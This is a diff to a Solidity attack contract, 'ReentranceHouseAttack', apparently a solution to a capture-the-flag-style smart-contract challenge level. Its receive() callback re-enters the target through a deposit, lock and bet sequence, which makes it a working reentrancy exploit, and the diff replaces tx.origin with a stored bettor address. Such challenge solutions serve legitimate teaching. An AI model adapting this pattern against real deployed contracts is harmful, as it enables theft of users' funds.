@@ -1,24 +1,19 @@
 // SPDX-License-Identifier: MIT
-
 pragma solidity ^0.8.0;
 
-import "../levels/ReentranceHouse.sol";
+import {ReentranceHouse, Pool, PoolToken} from "../levels/ReentranceHouse.sol";
 
 contract ReentranceHouseAttack {
     ReentranceHouse target;
     Pool pool;
     PoolToken depositToken;
+    address bettor;
 
-    constructor(address payable target_) payable {
+    constructor(address target_, address payable pool_, address depositToken_) payable {
         target = ReentranceHouse(target_);
-    }
-
-    function setNeededParameters(
-        address payable pool_,
-        address depositToken_
-    ) external {
         pool = Pool(pool_);
         depositToken = PoolToken(depositToken_);
+        bettor = msg.sender;
     }
 
     function attack() external payable {
@@ -28,10 +23,9 @@ contract ReentranceHouseAttack {
     }
 
     receive() external payable {
-        // approve
         depositToken.approve(address(pool), 5);
         pool.deposit(5);
         pool.lockDeposits();
-        target.makeBet(tx.origin);
+        target.makeBet(bettor);
     }
 }
